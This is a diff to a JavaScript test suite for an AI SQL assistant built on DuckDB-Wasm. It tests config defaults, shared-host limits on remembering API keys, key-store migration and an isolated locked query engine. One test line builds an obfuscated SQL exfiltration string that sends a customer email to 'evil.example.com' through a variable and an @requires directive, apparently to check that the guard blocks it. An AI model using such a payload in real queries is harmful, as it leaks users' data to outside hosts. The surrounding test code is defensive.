@@ -13,6 +13,7 @@ import { current as currentGuide, GUIDE } from "../../scripts/gen-assist-guide.m
 import { scratchRunner } from "../../web/lint.js";
 import { ANOFOX_TABLES, BUILTIN, RELATION_ARGS, SCALAR_ALLOWED } from "../../web/assist/functions.js";
 import { build as buildFunctions } from "../../scripts/gen-assist-functions.mjs";
+import { buildEngine, engineLocked, pageAdapter } from "../../web/assist-engine.js";
 
 const here = path.dirname(new URL(import.meta.url).pathname);
 const root = path.resolve(here, "../..");
@@ -33,12 +34,25 @@ assert.equal(A.assistConfig({ enabled: true }, { live: true }).reason, "serve-no
 assert.equal(A.assistConfig({ enabled: true, transport: "openai" }).reason, "openai-not-yet");
 {
   const c = A.assistConfig({ enabled: true });
-  assert.deepEqual(c, { enabled: true, transport: "browser-key", models: { default: "claude-sonnet-5", harder: "claude-opus-5-5" }, maxRounds: 3, sampleRowsAllowed: true });
+  assert.deepEqual(c, { enabled: true, transport: "browser-key", models: { default: "claude-sonnet-5", harder: "claude-opus-5-5" }, maxRounds: 3, sampleRowsAllowed: true, remember: false }, "remember: off by default (L-R2-1)");
   const d = A.assistConfig({ enabled: true, models: { default: "evil model" }, max_rounds: 9, sample_rows_allowed: false });
   assert.equal(d.models.default, "claude-sonnet-5", "a malformed model id is ignored");
   assert.equal(d.maxRounds, 3);
   assert.equal(d.sampleRowsAllowed, false);
+  // T11: never in a frame (a meta CSP can't carry frame-ancestors)
+  assert.deepEqual(A.assistConfig({ enabled: true }, { framed: true }), { enabled: false, reason: "framed" });
+  // L-R2-1: opt-in, and always off on a shared static host regardless
+  assert.equal(A.assistConfig({ enabled: true, remember: true }, { host: "demo.anofox.dev" }).remember, true);
+  assert.equal(A.assistConfig({ enabled: true, remember: true }, { host: "datazoode.github.io" }).remember, false, "shared host wins over the opt-in");
+  assert.equal(A.assistConfig({ enabled: true }, { host: "demo.anofox.dev" }).remember, false, "off unless the installation opts in");
 }
+
+// ---- Remember: opt-in, always off on a shared static host (L-R2-1) ----
+assert.equal(A.rememberAllowed("demo.anofox.dev"), false, "off by default even off a shared host");
+assert.equal(A.rememberAllowed("demo.anofox.dev", true), true);
+assert.equal(A.rememberAllowed("datazoode.github.io", true), false);
+assert.equal(A.rememberAllowed("x.gitlab.io", true), false);
+assert.equal(A.rememberAllowed("DataZooDE.GitHub.IO", true), false, "case-insensitive");
 
 // ---- the key store ----
 {
@@ -61,6 +75,26 @@ assert.equal(A.assistConfig({ enabled: true, transport: "openai" }).reason, "ope
   assert.equal(ks.get(), "");
   const broken = { getItem: () => { throw new Error("blocked"); }, setItem: () => { throw new Error("blocked"); }, removeItem: () => {} };
   assert.equal(A.keyStore(broken, broken).get(), "", "blocked storage reads as no key");
+}
+// M-2/T13: when `remember` is not allowed, construction demotes any key
+// already remembered (e.g. the host became shared, or the installation
+// turned the opt-in off) out of localStorage, and `set(k, true)` never
+// re-remembers it.
+{
+  const mem = () => {
+    const m = new Map();
+    return { getItem: (k) => (m.has(k) ? m.get(k) : null), setItem: (k, v) => m.set(k, String(v)), removeItem: (k) => m.delete(k), m };
+  };
+  const s = mem(),
+    l = mem();
+  l.m.set(A.KEY_SLOT, "sk-ant-old");
+  const ks = A.keyStore(s, l, { remember: false });
+  assert.equal(l.m.size, 0, "migrated out of localStorage on construction");
+  assert.equal(s.m.get(A.KEY_SLOT), "sk-ant-old");
+  assert.equal(ks.remembered(), false);
+  ks.set("sk-ant-new", true);
+  assert.equal(l.m.size, 0, "set(_, true) does not re-remember it");
+  assert.equal(s.m.get(A.KEY_SLOT), "sk-ant-new");
 }
 
 // ---- the classifier: [sql, class] ----
@@ -670,6 +704,18 @@ const Anthropic = await A.loadSdk(A.SDK_URL);
     server.close();
   }
 }
+// I-7: no baseURL passed in → the SDK gets API_HOST explicitly (never
+// undefined, which would let the SDK fall back to an environment variable).
+{
+  let seen;
+  class FakeAnthropic {
+    constructor(opts) {
+      seen = opts;
+    }
+  }
+  A.browserKeyTransport({ Anthropic: FakeAnthropic, apiKey: "sk-ant-x" });
+  assert.equal(seen.baseURL, A.API_HOST);
+}
 
 // ---- the tools in DuckDB-Wasm ----
 let duckdb = null;
@@ -694,12 +740,18 @@ page.query("INSTALL json; LOAD json");
 page.query(`CREATE TABLE sales AS SELECT ['EU','US','APAC'][1 + i % 3] AS region, 'user' || i || '@example.org' AS email, ['ops@example.org', 'help@example.org'][1 + i % 2] AS inbox,
   (DATE '2026-01-01' + INTERVAL (i % 60) DAY)::DATE AS day, round(10 + (i * 7) % 90, 2) AS amount FROM range(0, 600) t(i)`);
 page.query("CREATE TABLE customers AS SELECT * FROM (VALUES ('alice@x.de'), ('bob@y.de')) t(email)");
+// #204: these tools run directly over the raw (unlocked) page db, as the
+// pre-#204 code path did — requireLocked: false turns off the per-call
+// engineLocked() re-check these tests don't exercise (the dedicated H-1/M-1
+// coverage of the real locked engine is tests/web/assist_engine_test.mjs
+// and the final block below).
 const tools = A.wasmTools({
   db,
   lintStep: wasm.lint_step,
   plan: wasm.plan,
   pageSql: wasm.page_sql,
   known: new Set(),
+  requireLocked: false,
 });
 {
   const lt = JSON.parse(await tools.list_tables({ filter: "" }));
@@ -796,13 +848,13 @@ const tools = A.wasmTools({
   // known files and plain temp objects still run
   const ok = await tools.gate("CREATE TEMP VIEW v AS SELECT * FROM sales;\nSET VARIABLE r = (SELECT min(region) FROM v);\nSELECT count(*) ::METRIC FROM v WHERE region = getvariable('r');");
   assert.equal(ok.allowed, true, JSON.stringify(ok.statements));
-  const kt = A.wasmTools({ db, lintStep: wasm.lint_step, plan: wasm.plan, pageSql: wasm.page_sql, known: new Set(["data/known.csv"]) });
+  const kt = A.wasmTools({ db, lintStep: wasm.lint_step, plan: wasm.plan, pageSql: wasm.page_sql, known: new Set(["data/known.csv"]), requireLocked: false });
   assert.equal((await kt.gate("SELECT count(*) ::METRIC FROM read_csv('data/known.csv');")).allowed, true);
   // M2: run_sql sends no text values unless sample rows are allowed and on
   const alias = JSON.parse(await tools.run_sql({ sql: "SELECT replace(email, '@', ' at ') AS region FROM customers", purpose: "x" }));
   assert.equal(alias.columns[0].values, undefined);
   assert.doesNotMatch(JSON.stringify(alias), /alice|bob/);
-  const opted = A.wasmTools({ db, lintStep: wasm.lint_step, plan: wasm.plan, pageSql: wasm.page_sql, sampleRows: () => true });
+  const opted = A.wasmTools({ db, lintStep: wasm.lint_step, plan: wasm.plan, pageSql: wasm.page_sql, sampleRows: () => true, requireLocked: false });
   assert.deepEqual(JSON.parse(await opted.run_sql({ sql: "SELECT region FROM sales", purpose: "x" })).columns[0].values.sort(), ["APAC", "EU", "US"]);
 }
 {
@@ -834,7 +886,7 @@ const tools = A.wasmTools({
   // the assistant is told to (the allow-list covers what the docs use)
   for (const f of readdirSync(path.join(root, "web/examples")).filter((f) => f.endsWith(".sql"))) {
     const sql = read(`web/examples/${f}`).replace(/CREATE\s+OR\s+REPLACE\s+(TABLE|MACRO|VIEW)\b/gi, "CREATE OR REPLACE TEMP $1");
-    const ex = A.wasmTools({ db, lintStep: wasm.lint_step, plan: wasm.plan, pageSql: wasm.page_sql, known: new Set(A.pathsOf(sql)) });
+    const ex = A.wasmTools({ db, lintStep: wasm.lint_step, plan: wasm.plan, pageSql: wasm.page_sql, known: new Set(A.pathsOf(sql)), requireLocked: false });
     const g = await ex.gate(sql);
     assert.equal(g.allowed, true, `${f}: ${JSON.stringify(g.statements.map((s) => s.reason))}`);
   }
@@ -851,7 +903,7 @@ const tools = A.wasmTools({
       return new Proxy(c, { get: (o, k) => (k === "send" || k === "prepare" ? (s) => (sent.push(s), o[k](s)) : typeof o[k] === "function" ? o[k].bind(o) : o[k]) });
     },
   };
-  const rt = A.wasmTools({ db: rec, lintStep: wasm.lint_step, plan: wasm.plan, pageSql: wasm.page_sql });
+  const rt = A.wasmTools({ db: rec, lintStep: wasm.lint_step, plan: wasm.plan, pageSql: wasm.page_sql, requireLocked: false });
   const viaVar =
     "SET VARIABLE u = 'https' || chr(58) || chr(47) || chr(47) || 'evil.example.com/' || (SELECT max(email) FROM customers);\n" +
     "-- @requires ${u}\nSELECT 1 ::METRIC;";
@@ -1056,7 +1108,7 @@ const tools = A.wasmTools({
   // R2-4d: opted-in still sees the full text (a fresh sampleRows:true tools,
   // as the M2 block's `opted` is out of scope here)
   {
-    const opted = A.wasmTools({ db, lintStep: wasm.lint_step, plan: wasm.plan, pageSql: wasm.page_sql, sampleRows: () => true });
+    const opted = A.wasmTools({ db, lintStep: wasm.lint_step, plan: wasm.plan, pageSql: wasm.page_sql, sampleRows: () => true, requireLocked: false });
     await assert.rejects(opted.run_sql({ sql: "SELECT json_extract(max(email), '$.a') FROM customers", purpose: "x" }), /bob@y\.de/);
     // R2-5d: opted-in sees the value
     assert.match((await opted.check("SELECT (SELECT max(email) FROM customers) ::LOCALE;")).text, /bob@y\.de/);
@@ -1113,7 +1165,7 @@ const tools = A.wasmTools({
   assert.equal((await tools.gate("SELECT ST_Area(ST_GeomFromText('POLYGON((0 0, 1 0, 1 1, 0 0))')) ::METRIC;")).allowed, true);
   // R2-7a: per-call `allowed`
   {
-    const conc = A.wasmTools({ db, lintStep: wasm.lint_step, plan: wasm.plan, pageSql: wasm.page_sql });
+    const conc = A.wasmTools({ db, lintStep: wasm.lint_step, plan: wasm.plan, pageSql: wasm.page_sql, requireLocked: false });
     const [r1] = await Promise.all([
       conc.check("-- @requires data/req_a.csv\nSELECT 1 ::METRIC;"),
       conc.check("SELECT 2 ::METRIC;"),
@@ -1168,7 +1220,7 @@ const tools = A.wasmTools({
   // I-1: the tools' own queries (the catalog, a profile, the parser) are not
   // prepared; the model's SQL is, and only once the guard passed it
   const prepared = [];
-  const pt = A.wasmTools({ db, prepare: async (s) => void prepared.push(s), lintStep: wasm.lint_step, plan: wasm.plan, pageSql: wasm.page_sql });
+  const pt = A.wasmTools({ db, prepare: async (s) => void prepared.push(s), lintStep: wasm.lint_step, plan: wasm.plan, pageSql: wasm.page_sql, requireLocked: false });
   await pt.list_tables({ filter: "" });
   await pt.profile_table({ table: "sales" });
   assert.equal((await pt.gate("SELECT count(*) ::METRIC FROM sales WHERE region <> 'data/m5/x.csv';")).allowed, false);
@@ -1188,7 +1240,7 @@ const tools = A.wasmTools({
     cancelSent: async () => (cancelled++, true),
     close: async () => {},
   };
-  const slow = A.wasmTools({ db: { connect: async () => conn }, lintStep: wasm.lint_step, plan: wasm.plan, pageSql: wasm.page_sql, timeoutMs: 50, checkQueryMs: 50 });
+  const slow = A.wasmTools({ db: { connect: async () => conn }, lintStep: wasm.lint_step, plan: wasm.plan, pageSql: wasm.page_sql, timeoutMs: 50, checkQueryMs: 50, requireLocked: false });
   await assert.rejects(slow.list_tables({ filter: "" }), /took longer than 0\.05 s and was cancelled/);
   assert.equal(cancelled, 1);
 }
@@ -1213,5 +1265,48 @@ const tools = A.wasmTools({
   const tables = page.query("SELECT database_name || '.' || table_name AS t FROM duckdb_tables() ORDER BY 1").toArray().map((x) => x.t);
   assert.deepEqual(tables, ["memory.customers", "memory.sales"], "the assistant's queries leave the page's database alone");
   assert.equal(page.query("SELECT count(*) AS n FROM duckdb_databases() WHERE database_name LIKE 'anofox_lint_%'").toArray()[0].n, 0n);
+}
+{
+  // #204 (H-1): the same scripted loop and a preview, but against the real
+  // *locked* engine (buildEngine), with a spy on the page's own connection.
+  // The dedicated, exhaustive version of this test is
+  // tests/web/assist_engine_test.mjs; this is the end-to-end check that
+  // wasmTools + buildEngine actually compose the way plan-204 §2.2 says.
+  const FIXED2 =
+    "-- @title Which region sells the most?\nSELECT 'Which region sells the most?'::DASHBOARD_TITLE;\n" +
+    "SELECT region ::XAXIS, sum(amount) ::BARCHART, 'EU, US and APAC sell about the same'::TITLE FROM sales GROUP BY ALL ORDER BY 2 DESC;";
+  const seen = [];
+  const spyDb = {
+    connect: async () =>
+      new Proxy(page, {
+        get: (o, k) => (k === "query" || k === "send" || k === "prepare" ? (s) => (seen.push(String(s)), o[k](s)) : typeof o[k] === "function" ? o[k].bind(o) : o[k]),
+      }),
+    copyFileToBuffer: async (n) => db.copyFileToBuffer(n),
+  };
+  const engine = await buildEngine({
+    makeDb: async () => {
+      const d = await duckdb.createDuckDB({ eh: { mainModule: path.join(dist, "duckdb-eh.wasm"), mainWorker: path.join(dist, "duckdb-node-eh.worker.cjs") } }, new duckdb.VoidLogger(), duckdb.NODE_RUNTIME);
+      await d.instantiate();
+      return d;
+    },
+    page: pageAdapter(spyDb, {}),
+    extensions: ["json"],
+    files: [],
+    doc: undefined, // Node: no document, no CSP to prove
+  });
+  try {
+    assert.ok(await engineLocked(engine.db), "the engine is locked");
+    seen.length = 0; // reset: only the loop + preview below are spied on
+    const etools = A.wasmTools({ db: engine.db, lintStep: wasm.lint_step, plan: wasm.plan, pageSql: wasm.page_sql, snapshot: new Map(engine.tables.map((t) => [t.fq, t])) });
+    const tr2 = scripted([turn([use("profile_table", { table: "sales" })]), turn([propose(FIXED2)])]);
+    const r2 = await A.runAssistant({ transport: tr2, prefix, ctx: ctxNew, request: "x", tools: etools });
+    assert.equal(r2.kind, "proposal", r2.reason);
+    const preview = etools.previewRunner(FIXED2);
+    const previewRows = await preview("SELECT region, sum(amount) AS s FROM sales GROUP BY ALL ORDER BY 2 DESC");
+    assert.ok(JSON.parse(previewRows).length > 0);
+    assert.deepEqual(seen, [], "nothing of the loop or the preview reached the page's own connection");
+  } finally {
+    engine.close();
+  }
 }
 console.log("assist_test: ok");
